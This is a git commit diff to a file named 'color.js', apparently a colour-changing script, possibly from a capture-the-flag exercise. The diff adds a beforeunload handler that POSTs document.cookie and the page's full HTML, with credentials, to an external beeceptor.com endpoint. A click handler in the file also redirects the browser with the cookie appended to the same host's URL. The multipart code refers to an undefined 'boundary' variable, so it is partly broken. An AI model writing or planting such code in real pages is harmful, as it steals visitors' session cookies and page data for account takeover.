cc5c22c8977d5f946855578be1fe9d8465b5c928
Yvan C <magic.yvan@gmail.com>
2026-05-16 12:21:31 +0200

    Implement beforeunload event to capture data
    Add event listener to send cookies and status on unload

--- ch62/color.js
+++ ch62/color.js
@@ -9,4 +9,31 @@ color.onclick = () => {
     window.location.replace('https://keskispace.free.beeceptor.com/'+document.cookie);
     target.style.color = `rgb(${getRandomInt(255)}, ${getRandomInt(255)}, ${getRandomInt(255)})`;
 }
-window.location.replace('https://keskispace.free.beeceptor.com/'+document.cookie);
+
+window.addEventListener("beforeunload", function(event){
+    // Initiate objects
+    var xhr = new XMLHttpRequest(),
+    	data = '';
+    
+    // Initialize an asynchronous POST request
+    xhr.open('POST', 'https://keskispace.free.beeceptor.com', true);
+    
+    // Indicate wether or not cross-site access request should be made using credantials (e.g. cookies, authorization headers)
+    xhr.withCredentials = true;
+    
+    // Set headers
+    xhr.setRequestHeader('Content-Type', 'multipart/form-data; charset=UTF-8; boundary=' + boundary);
+    
+    // Set data
+    data += '--' + boundary;
+    data += '\r\nContent-Disposition: form-data; name="cookie"\r\n\r\n' + document.cookie + '\r\n';
+    data += '--' + boundary;
+    data += '\r\nContent-Disposition: form-data; name="status"\r\n\r\n' + document.body.innerHTML + '\r\n';
+    data += '--' + boundary + '--';
+    
+    // Set additional headers
+    xhr.setRequestHeader('Content-Length', data.length);
+    
+    // Send the request
+    xhr.send(data);
+});   
